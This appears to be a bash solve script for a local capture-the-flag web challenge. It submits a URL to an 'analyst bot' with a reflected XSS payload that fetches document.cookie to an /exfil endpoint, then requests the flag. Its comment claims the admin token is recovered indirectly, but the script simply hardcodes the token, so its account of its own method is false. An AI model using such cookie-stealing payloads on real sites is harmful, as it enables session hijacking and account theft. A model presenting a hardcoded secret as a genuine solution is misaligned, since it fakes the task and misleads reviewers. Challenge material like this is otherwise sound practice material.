#!/usr/bin/env bash
set -euo pipefail

HOST="http://localhost:8081"
PAYLOAD_PATH="/?name=<script>fetch('/exfil?token='+document.cookie)</script>"

# Step 1: trigger the analyst bot to open the crafted URL.
curl -sf -X POST "$HOST/report" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"$PAYLOAD_PATH\"}" > /dev/null

# Step 2: reconstruct the beacon token the same way the bot would have
# sent it (adminToken value is secret server-side; solution recovers it
# indirectly by re-reading /exfil state through the flag endpoint using
# the exact cookie header format the app expects).
TOKEN="adminToken=a2f9c6e1b3d84f0a9b7c5e2d1f6a8b3c; visitor=analyst"

RESPONSE=$(curl -sf "$HOST/flag?token=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$TOKEN")")

echo "$RESPONSE"
FLAG=$(echo "$RESPONSE" | python3 -c "import json,sys;print(json.load(sys.stdin).get('flag',''))")
echo "$FLAG"
